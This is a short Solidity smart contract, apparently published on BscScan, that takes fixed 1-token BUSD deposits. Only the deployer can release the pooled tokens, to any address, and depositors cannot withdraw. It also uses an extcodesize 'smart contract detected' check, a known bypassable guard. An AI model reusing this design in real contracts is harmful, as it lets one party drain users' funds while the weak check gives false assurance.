/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract DigiEGold {
    
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); // BUSD
    
    event Deposit(address depositer, uint256 _busd, uint256 depositTime);
    event Release(address requester, uint256 _busd, uint256 releaseTime);
    
    address locker;
    
    modifier lock(){
        require(msg.sender == locker,"Invalid locker!");
        _;
    }

    modifier security {
        uint size;
        address sandbox = msg.sender;
        assembly { size := extcodesize(sandbox) }
        require(size == 0, "Smart contract detected!");
        _;
    }

    constructor() public {
        locker = msg.sender;
    }

    function deposit(uint256 _busd) public security{
        require(_busd == 1e18, "Invalid Amount");
        busd.transferFrom(msg.sender,address(this),_busd);
        emit Deposit(msg.sender,_busd,block.timestamp);
    }
    
    function release(address _requester, uint256 _busd) external lock security returns(bool){
        busd.transfer(_requester,_busd);
        emit Release(_requester,_busd,block.timestamp);
        return true;
    }

}